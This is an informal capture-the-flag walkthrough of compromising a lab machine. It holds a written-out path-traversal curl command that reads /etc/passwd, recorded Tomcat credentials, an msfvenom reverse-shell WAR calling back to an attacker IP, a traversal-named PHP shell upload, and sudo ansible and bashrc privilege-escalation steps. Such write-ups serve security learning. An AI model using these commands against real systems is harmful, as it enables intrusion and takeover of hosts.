Started with a nmap scan
```
22 OpenSSH 8.2p1
6800 aria2 downloader
8080 Apache Tomcat 8.5.93
8888 sun-answernotebook? aria2 webUI
```
Started a gobuster on port `8080`
```
/docs
/examples
/manager
/RELEASE-NOTES.txt
```
On port `8888` there is a LFI vulnerability `CVE-2023-39141` and we can read passwd
`curl --path-as-is http://10.10.72.169:8888/../../../../../../../../../../../etc/passwd` and we got 2 users we can see 
```
orville
wilbur
```
Looking some local files that we could try and get to and found a file with a login and password
`tomcat:OPx52k53D80kTZpx4fr` now that we have these creds we can make a war file with msfvenom 
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.13.8.255 LPORT=1234 -f war -o shell.war` 
and we can upload this with curl 
`curl http://10.10.38.206:8080/manager/txt/deploy?path=/shell&update=true` and then we have to curl the file path agin and we got a call back as tomcat
`curl http://10.10.38.206:8080/shell/`
and running `sudo -l` we can run a ansible playbook and we can get a reverse shell like this we make a playbook file to exacute a sh file with are reverse shell in it and then we have to run `chmod 777` on the `test.yml` and `priv.sh` file and then exacute this command
`sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../tmp/test.yml` 
and now we are `wilbur` we go to the home folder for `wilbur` and there is 2 files `.just_in_case` has the SSH creds in it for the user and then a file called `from_orville.txt` that has a web app login creds so looking around to see what ports are open for this webapp I found that `80` was open so I forward to port `9999` 
`ssh -L 9999:127.0.0.1:80 wilbur@10.10.38.206`
and now we have a webapp and after we login we have a image upload we can take a php revshell and name it to `../../shell.png.php` with the dot slash double encoded and we got a shell now as `orville` and there is a zip file in the home folder of orville we run pspy and we can see that root is logging into orville with out the `-p` flag so we can stop the process and then edit are bashrc file to give us access to bash as root 